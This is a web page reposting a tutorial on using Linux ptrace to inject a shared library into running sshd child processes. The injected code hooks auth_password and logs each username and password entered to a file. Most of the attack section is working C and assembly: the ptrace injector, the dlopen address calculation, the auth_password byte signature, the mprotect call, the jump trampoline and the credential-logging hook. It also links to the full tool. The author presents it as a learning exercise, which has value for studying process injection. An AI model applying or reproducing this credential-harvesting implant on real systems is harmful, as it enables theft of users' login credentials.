<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Introduction to ptrace or code injection in sshd for fun</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The goal I set was quite simple: find out the password entered in sshd using ptrace. Of course, this is a somewhat artificial task, as there are many ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Introduction to ptrace or code injection in sshd for fun</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/webt/ep/w1/el/epw1elpz3alvv_6vifmtdbazam0.png"><br><br>  The goal I set was quite simple: find out the password entered in sshd using ptrace.  Of course, this is a somewhat artificial task, as there are many other, more efficient ways to achieve the desired (and with a much lower probability of getting <abbr title="Segmentation fault">SEGV</abbr> ), however, it seemed to me cool to do just that. <br><a name="habracut"></a><br><h1>  What is ptrace? </h1><br>  Those familiar with injections in Windows probably know the functions <code>VirtualAllocEx()</code> , <code>WriteProcessMemory()</code> , <code>ReadProcessMemory()</code> and <code>CreateRemoteThread()</code> .  These calls allow you to allocate memory and run threads in another process.  In the linux world, the kernel provides us with <code>ptrace</code> , through which debuggers can interact with the running process. <br><br>  Ptrace offers several useful debugging operations, for example: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <ul><li>  PTRACE_ATTACH - allows you to join one process by pausing the process being debugged </li><li>  PTRACE_PEEKTEXT - allows you to read data from the address space of another process </li><li>  PTRACE_POKETEXT - allows you to write data to the address space of another process </li><li>  PTRACE_GETREGS - reads the current state of the process registers </li><li>  PTRACE_SETREGS - records the status of process registers </li><li>  PTRACE_CONT - continues execution of the process being debugged </li></ul><br>  Although this is an incomplete list of ptrace features, however, I ran into difficulties due to the lack of familiar features from Win32.  For example, in Windows, you can allocate memory in another process using the <code>VirtualAllocEx()</code> function, which returns a pointer to the newly allocated memory.  Since there is no such thing in ptrace, you have to improvise if you want to embed your code in another process. <br><br>  Well, let's think about how to take control over the process using ptrace. <br><br><h1>  Basics of ptrace </h1><br>  The first thing we need to do is to join the process of interest to us.  To do this, just call ptrace with the PTRACE_ATTACH parameter: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_ATTACH, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  This call is simple as a traffic jam, it takes the PID of the process we want to join.  When a call occurs, a SIGSTOP signal is sent, which forces the process of interest to stop. <br><br>  After joining, there is a reason to save the state of all the registers before we start changing something.  This will allow us to restore the program later: <br><br><pre> <code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">user_regs_struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oldregs</span></span></span><span class="hljs-class">;</span></span> ptrace(PTRACE_GETREGS, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;oldregs);</code> </pre><br>  Next, you need to find a place where we can write our code.  The easiest way is to extract information from the maps file, which can be found in procfs for each process.  For example, "/ proc / PID / maps" on the running sshd process on Ubuntu looks like this: <br><br><img src="https://habrastorage.org/webt/me/_2/ug/me_2ugeh7hugdyuqx_xfkp-myuy.png"><br><br>  We need to find the memory area allocated with the right to execute (most likely ‚Äúr-xp‚Äù).  Immediately, as we find the area that is suitable for us, by analogy with the registers, we will save the contents in order to restore the work correctly: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_PEEKTEXT, pid, addr, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  With ptrace, you can read one machine data word (32 bits per x86 or 64 bits per x86_64) at a specified address, that is, you need to make several calls to read more data by increasing the address. <br><br>  <i>Note: linux also has process_vm_readv () and process_vm_writev () for working with the address space of another process.</i>  <i>However, in this article I will stick to using ptrace.</i>  <i>If you want to do something of your own, it is better to read about these functions.</i> <br><br>  Now that we‚Äôve backed up the memory we liked, we can start overwriting: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_POKETEXT, pid, addr, word);</code> </pre><br>  Similar to PTRACE_PEEKTEXT, this call can only write one machine word at a time at a specified address.  Also, to write more than one machine word you need a lot of calls. <br><br>  After loading your code you need to transfer control to it  In order not to overwrite the data in memory (for example, the stack), we will use the previously saved registers: <br><br><pre> <code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">user_regs_struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">r</span></span></span><span class="hljs-class">;</span></span> <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(&amp;r, &amp;oldregs, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(struct user_regs_struct)); <span class="hljs-comment"><span class="hljs-comment">// Update RIP to point to our injected code regs.rip = addr_of_injected_code; ptrace(PTRACE_SETREGS, pid, NULL, &amp;r);</span></span></code> </pre><br>  Finally, we can continue execution using PTRACE_CONT: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_CONT, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  But how do we know that our code has finished executing?  We will use a software interrupt, also known as an ‚Äúint 0x03‚Äù instruction, that generates SIGTRAP.  We will wait for this using waitpid (): <br><br><pre> <code class="cpp hljs">waitpid(pid, &amp;status, WUNTRACED);</code> </pre><br>  waitpid () is a blocking call that will wait for the process to stop with the PID and write the reason for the stop to the status variable.  Here, by the way, there are a lot of macros that will simplify life in finding out the reason for the stop. <br><br>  To find out if there was a stop due to SIGTRAP (due to the int 0x03 call), we can do this: <br><br><pre> <code class="cpp hljs">waitpid(pid, &amp;status, WUNTRACED); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (WIFSTOPPED(status) &amp;&amp; WSTOPSIG(status) == SIGTRAP) { <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"SIGTRAP received\n"</span></span>); }</code> </pre><br>  At this point, our embedded code has already run and all we need is to restore the original state of the process.  Restore all registers: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_SETREGS, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;origregs);</code> </pre><br>  Then we will return the original data in memory: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_POKETEXT, pid, addr, word);</code> </pre><br>  And disconnect from the process: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_DETACH, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  That's enough theory.  Let's move on to the more interesting part. <br><br><h1>  Sshd injection </h1><br>  <i>I have to warn you that there is some chance of dropping sshd, so be careful and please do not try to check it on a production system and even more so on a remote system via SSH: D</i> <i><br><br></i>  <i>Moreover, there are several better ways to achieve the same result, I‚Äôm demonstrating this one exclusively as a fun way to show the power of ptrace (agree, this is steeper than the injection in Hello World;)</i> <br><br>  The only thing I wanted to do was get the login-password combination from running sshd when the user is authenticated.  When viewing the source code, we can see something like this: <br><br>  <a href="">auth-passwd.c</a> <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">/* * Tries to authenticate the user using password. Returns true if * authentication succeeds. */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">auth_password</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Authctxt *authctxt, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *password)</span></span></span><span class="hljs-function"> </span></span>{ ... }</code> </pre><br>  It looks like a great place to try to remove the username / password transmitted by the user in the clear. <br><br>  We want to find the signature of the function that will allow us to find its [function] in memory.  I use my favorite disassembly utility, radare2: <br><br><img src="https://habrastorage.org/webt/4r/xx/z_/4rxxz_4bv-g5uoo3fiqsxueeefo.png"><br><br>  You must find a sequence of bytes that is unique and is found only in the auth_password function.  For this we will use the search in radare2: <br><br><img src="https://habrastorage.org/webt/aq/ie/qt/aqieqttr95rwwklbsvyiwnh86no.png"><br><br>  It so happened that the sequence <code>xor rdx, rdx; cmp rax, 0x400</code>  <code>xor rdx, rdx; cmp rax, 0x400</code> fits our requirements and is found only once in the entire ELF file. <br><br>  As a note ... If you do not have this sequence, make sure that you have the newest version, which also <a href="">closes the</a> vulnerability of the middle of 2016. (in version 7.6, such a sequence is also unique). <br><br>  The next step is code injection. <br><br><h1>  Load .so into sshd </h1><br>  To load our code into sshd, we will make a small stub, which will allow us to call dlopen () and load the dynamic library, which will already do the auth_password substitution. <br><br>  dlopen () is a call for dynamic linking, which takes in arguments the path to the dynamic library and loads it into the address space of the calling process.  This function is in libdl.so, which is dynamically linked to the application. <br><br>  Fortunately, in our case libdl.so is already loaded in sshd, so all we have to do is execute dlopen ().  However, because of the <abbr title="Address space layout randomization">ASLR, it is</abbr> very unlikely that dlopen () will be in the same place every time, so you will have to find its address in sshd memory. <br><br>  In order to find the address of a function, you need to calculate the offset - the difference between the address of the dlopen () function and the starting address of libdl.so: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> libdlAddr, dlopenAddr; libdlAddr = (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)dlopen(<span class="hljs-string"><span class="hljs-string">"libdl.so"</span></span>, RTLD_LAZY); dlopenAddr = (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)dlsym(libdlAddr, <span class="hljs-string"><span class="hljs-string">"dlopen"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"Offset: %llx\n"</span></span>, dlopenAddr - libdlAddr);</code> </pre><br>  Now that we have calculated the offset, we need to find the starting address of libdl.so from the maps file: <br><br><img src="https://habrastorage.org/webt/pm/vu/ja/pmvuja0gax1gdlqv48bwpeiadu0.png"><br><br>  By knowing the base address of libdl.so in sshd (0x7f0490a0d000, as follows from the screenshot above), we can add an offset and get the address dlopen () to call from the injection code. <br><br>  All the necessary addresses will be passed through registers using PTRACE_SETREGS. <br><br>  It is also necessary to write the path to the implanted library into the sshd address space, for example: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ptraceWrite</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> pid, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> addr, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *data, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> len)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> word = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (i=<span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; len; i+=<span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(word), word=<span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(&amp;word, data + i, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(word)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ptrace(PTRACE_POKETEXT, pid, addr + i, word)) == <span class="hljs-number"><span class="hljs-number">-1</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"[!] Error writing process memory\n"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>); } } } ptraceWrite(pid, (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)freeaddr, <span class="hljs-string"><span class="hljs-string">"/tmp/inject.so\x00"</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>)</code> </pre><br>  By doing as much as possible during the preparation of the injection and loading the pointers to the arguments directly into the registers, we can make the code-injection easier.  For example: <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Update RIP to point to our code, which will be just after // our injected library name string regs.rip = (unsigned long long)freeaddr + DLOPEN_STRING_LEN + NOP_SLED_LEN; // Update RAX to point to dlopen() regs.rax = (unsigned long long)dlopenAddr; // Update RDI to point to our library name string regs.rdi = (unsigned long long)freeaddr; // Set RSI as RTLD_LAZY for the dlopen call regs.rsi = 2; // RTLD_LAZY // Update the target process registers ptrace(PTRACE_SETREGS, pid, NULL, &amp;regs);</span></span></code> </pre><br>  That is, the code injection is quite simple: <br><br><pre> <code class="cpp hljs">; RSI <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> as value <span class="hljs-string"><span class="hljs-string">'2'</span></span> (RTLD_LAZY) ; RDI <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> as <span class="hljs-keyword"><span class="hljs-keyword">char</span></span>* to shared library path ; RAX contains the address of dlopen call rax <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> <span class="hljs-number"><span class="hljs-number">0x03</span></span></code> </pre><br>  It is time to create our dynamic library, which will be loaded by code injection. <br><br>  Before we move on, consider one important thing that will be used ... Constructor of the dynamic library. <br><br><h1>  Constructor in dynamic libraries </h1><br>  Dynamic libraries can execute code when loading.  To do this, mark the functions with the decorator "__attribute __ ((constructor))".  For example: <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; void __attribute__((constructor)) test(void) { printf("Library loaded on dlopen()\n"); }</span></span></span></span></code> </pre> <br>  You can copy it with a simple command: <br><br><pre> <code class="bash hljs">gcc -o test.so --shared -fPIC test.c</code> </pre><br>  And then check the performance: <br><br><pre> <code class="cpp hljs">dlopen(<span class="hljs-string"><span class="hljs-string">"./test.so"</span></span>, RTLD_LAZY);</code> </pre><br>  When the library loads, the constructor will also be called: <br><br><img src="https://habrastorage.org/webt/c1/ez/ao/c1ezaodwm4j0tk8mmqmhwhjbl5i.png"><br><br>  We also use this functionality to make our lives easier when code is injected into the address space of another process. <br><br><h1>  Sshd dynamic library </h1><br>  Now that we have the ability to load our dynamic library, we need to create code that will change the behavior of auth_password () at runtime. <br><br>  When our dynamic library is loaded, we can find the starting address of sshd using the file "/ proc / self / maps" in procfs.  We are looking for a domain with ‚Äúrx‚Äù rights in which we will search for a unique sequence in auth_password (): <br><br><pre> <code class="cpp hljs">d = fopen(<span class="hljs-string"><span class="hljs-string">"/proc/self/maps"</span></span>, <span class="hljs-string"><span class="hljs-string">"r"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(fgets(buffer, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(buffer), fd)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"/sshd"</span></span>) &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"rx"</span></span>)) { ptr = strtoull(buffer, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); end = strtoull(<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"-"</span></span>)+<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre><br>  Once we have a range of addresses to search for, look for the function: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">const</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *search = <span class="hljs-string"><span class="hljs-string">"\x31\xd2\x48\x3d\x00\x04\x00\x00"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(ptr &lt; end) { <span class="hljs-comment"><span class="hljs-comment">// ptr[0] == search[0] added to increase performance during searching // no point calling memcmp if the first byte doesn't match our signature. if (ptr[0] == search[0] &amp;&amp; memcmp(ptr, search, 9) == 0) { break; } ptr++; }</span></span></code> </pre><br>  When we have a match, you need to use mprotect () to change the permissions on the memory area.  This is all because the memory area is available for reading and execution, and for changes on the go, write rights are required: <br><br><pre> <code class="cpp hljs">mprotect((<span class="hljs-keyword"><span class="hljs-keyword">void</span></span>*)(((<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)ptr / <span class="hljs-number"><span class="hljs-number">4096</span></span>) * <span class="hljs-number"><span class="hljs-number">4096</span></span>), <span class="hljs-number"><span class="hljs-number">4096</span></span>*<span class="hljs-number"><span class="hljs-number">2</span></span>, PROT_READ | PROT_WRITE | PROT_EXEC)</code> </pre><br>  Great, we have the right to write to the desired memory area and now it is time to add a small springboard at the beginning of the auth_password function, which will transfer control to the hook: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">char</span></span> jmphook[] = <span class="hljs-string"><span class="hljs-string">"\x48\xb8\x48\x47\x46\x45\x44\x43\x42\x41\xff\xe0"</span></span>;</code> </pre><br>  This is equivalent to this code: <br><br><pre> <code class="cpp hljs">mov rax, <span class="hljs-number"><span class="hljs-number">0x4142434445464748</span></span> jmp rax</code> </pre> <br>  Of course, the address 0x4142434445464748 is not suitable for us and it will be replaced with the address of our hook: <br><br><pre> <code class="cpp hljs">*(<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> *)((<span class="hljs-keyword"><span class="hljs-keyword">char</span></span>*)jmphook+<span class="hljs-number"><span class="hljs-number">2</span></span>) = &amp;passwd_hook;</code> </pre> <br>  Now we can just insert our springboard into sshd.  To make the injection beautiful and clean, we insert the springboard at the very beginning of the function: <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Step back to the start of the function, which is 32 bytes // before our signature ptr -= 32; memcpy(ptr, jmphook, sizeof(jmphook));</span></span></code> </pre><br>  Now we need to implement a hook that will log the data passing through.  We must be sure to save all registers before the hook and restore it before returning to the original code: <br><br><div class="spoiler">  <b class="spoiler_title">Hook source code</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Remember the prolog: push rbp; mov rbp, rsp; // that takes place when entering this function void passwd_hook(void *arg1, char *password) { // We want to store our registers for later asm("push %rsi\n" "push %rdi\n" "push %rax\n" "push %rbx\n" "push %rcx\n" "push %rdx\n" "push %r8\n" "push %r9\n" "push %r10\n" "push %r11\n" "push %r12\n" "push %rbp\n" "push %rsp\n" ); // Our code here, is used to store the username and password char buffer[1024]; int log = open(PASSWORD_LOCATION, O_CREAT | O_RDWR | O_APPEND); // Note: The magic offset of "arg1 + 32" contains a pointer to // the username from the passed argument. snprintf(buffer, sizeof(buffer), "Password entered: [%s] %s\n", *(void **)(arg1 + 32), password); write(log, buffer, strlen(buffer)); close(log); asm("pop %rsp\n" "pop %rbp\n" "pop %r12\n" "pop %r11\n" "pop %r10\n" "pop %r9\n" "pop %r8\n" "pop %rdx\n" "pop %rcx\n" "pop %rbx\n" "pop %rax\n" "pop %rdi\n" "pop %rsi\n" ); // Recover from the function prologue asm("mov %rbp, %rsp\n" "pop %rbp\n" ); ...</span></span></code> </pre><br></div></div><br>  Well, that's all ... in a sense ... <br><br>  Unfortunately, after all that has been done, this is not all.  Even if the code injection into sshd was successful, you can see that the user passwords you are looking for are still not available.  This is due to the fact that sshd for each connection creates a new child.  It is the new child that handles the connection and it is in it that we must install the hook. <br><br>  To be sure that we are working with sshd children, I decided to scan procfs for stats files that specify the Parent PID sshd.  As soon as such a process is found, the injector is launched for it. <br><br>  This even has its advantages.  If everything does not go according to plan and the code-injection falls from SIGSEGV, only the process of one user will be killed, but not the parent process of sshd.  Not the biggest consolation, but it clearly makes debugging easier. <br><br><h1>  Injection in action </h1><br>  Ok, let's see the demo: <br><br> <a href="https://asciinema.org/a/5i0dcmskkdwomlv6su2sxx07v"><img src="https://asciinema.org/a/5i0dcmskkdwomlv6su2sxx07v.svg"></a> <br><br>  The full code can be found <a href="https://github.com/xpn/ssh-inject">here</a> . <br><br>  I hope this trip gave you enough information to push ptrace on your own. <br><br>  I want to thank the following people and sites that helped deal with ptrace: <br><br><ul><li>  <a href="https://github.com/gaffe23/linux-inject">Gaffe23 toolkits for dynamic library injection</a> </li><li>  <a href="https://www.evilsocket.net/2015/05/01/dynamically-inject-a-shared-library-into-a-running-process-on-androidarm/">Wonderful job EvilSocket injection process</a> </li></ul></div><p>Source: <a href="https://habr.com/ru/post/430302/">https://habr.com/ru/post/430302/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../430290/index.html">Attempt to predict the fourth iteration of the SpaceX BFR project</a></li>
<li><a href="../430292/index.html">Electronic Frontier Foundation: network performance of police car license scanners in the US - 0.5%</a></li>
<li><a href="../430294/index.html">10 unobvious benefits of using Rust</a></li>
<li><a href="../430296/index.html">Make your ideas come app. Serverless application - step by step instructions</a></li>
<li><a href="../430300/index.html">Microservices on Go with the Go kit: Introduction</a></li>
<li><a href="../430304/index.html">Wonderful outpost in orbit</a></li>
<li><a href="../430306/index.html">Drilled the first tunnel Boring Company Ilona Mask</a></li>
<li><a href="../430308/index.html">Python internals. Easter eggs</a></li>
<li><a href="../430312/index.html">Validation of complex forms React. Part 1</a></li>
<li><a href="../430314/index.html">Another telegram-bot or implementation of a dating bot</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>